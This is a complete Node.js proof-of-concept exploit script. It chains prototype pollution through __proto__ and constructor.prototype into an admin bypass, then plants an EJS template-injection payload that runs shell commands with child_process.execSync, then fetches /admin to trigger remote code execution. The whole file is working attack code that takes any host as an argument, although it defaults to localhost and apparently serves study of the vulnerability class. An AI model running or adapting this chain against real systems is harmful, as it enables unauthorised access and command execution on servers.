// exploit.js
// PoC chain: Prototype Pollution -> Admin Bypass -> EJS SSTI -> RCE
// Usage: node exploit.js [host]
// Example: node exploit.js http://localhost:3000

const http = require('http');
const https = require('https');
const { URL } = require('url');

const host = process.argv[2] || 'http://localhost:3000';
const base = new URL(host);
const agent = base.protocol === 'https:' ? https : http;

function request(method, path, body) {
  return new Promise((resolve, reject) => {
    const data = body ? Buffer.from(JSON.stringify(body)) : undefined;
    const req = agent.request(
      {
        hostname: base.hostname,
        port: base.port || (base.protocol === 'https:' ? 443 : 80),
        path,
        method,
        headers: {
          'Content-Type': 'application/json',
          ...(data ? { 'Content-Length': String(data.length) } : {}),
        },
      },
      (res) => {
        let chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const buf = Buffer.concat(chunks);
          resolve({ status: res.statusCode, headers: res.headers, body: buf.toString('utf8') });
        });
      }
    );
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

(async () => {
  try {
    console.log('[1] Polluting prototype to set isAdmin=true (attempt __proto__)...');
    let p1 = await request('POST', '/update-profile', { __proto__: { isAdmin: true } });
    console.log('    ->', p1.status, p1.body);

    console.log('[1b] Polluting via constructor.prototype (more reliable on modern lodash)...');
    let p1b = await request('POST', '/update-profile', { constructor: { prototype: { isAdmin: true } } });
    console.log('    ->', p1b.status, p1b.body);

    console.log('[2] Setting user.bio to an EJS payload that executes a command...');
    const cmd = process.platform.startsWith('win') ? 'whoami' : 'id';
    const payload = `<%= require('child_process').execSync('${cmd}').toString() %>`;
    const p2 = await request('POST', '/update-profile', { bio: payload });
    console.log('    ->', p2.status, p2.body);

    console.log('[3] Requesting /admin to trigger SSTI and print command output...');
    const p3 = await request('GET', '/admin');
    console.log('    ->', p3.status);
    console.log('\n===== /admin response =====\n');
    console.log(p3.body);
    console.log('\n===========================');
  } catch (err) {
    console.error('Exploit failed:', err);
    process.exit(1);
  }
})();
